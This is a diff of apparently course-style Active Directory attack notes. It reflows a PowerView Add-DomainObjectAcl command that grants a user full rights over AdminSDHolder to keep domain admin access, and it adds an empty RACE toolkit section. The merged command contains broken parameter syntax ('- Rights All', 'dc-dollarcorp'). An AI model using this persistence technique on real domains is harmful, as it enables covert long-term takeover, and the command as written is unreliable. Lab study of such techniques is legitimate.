@@ -414,14 +414,23 @@ All local logons on the DC are now logged to `C:\Windows\system32\mimilsa.log`
 
 
 
-- Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
+- Add FullControl permissions for a user to the AdminSDHolder using `PowerView` as DA:
 
 
 ```powershell
 # Powerview
 
-Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -
-Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain
-dollarcorp.moneycorp.local -Verbose
+Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 - Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
+```
+
+
+
+- Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE) :
+
+
+
+
+```powershell
+
+
 ```
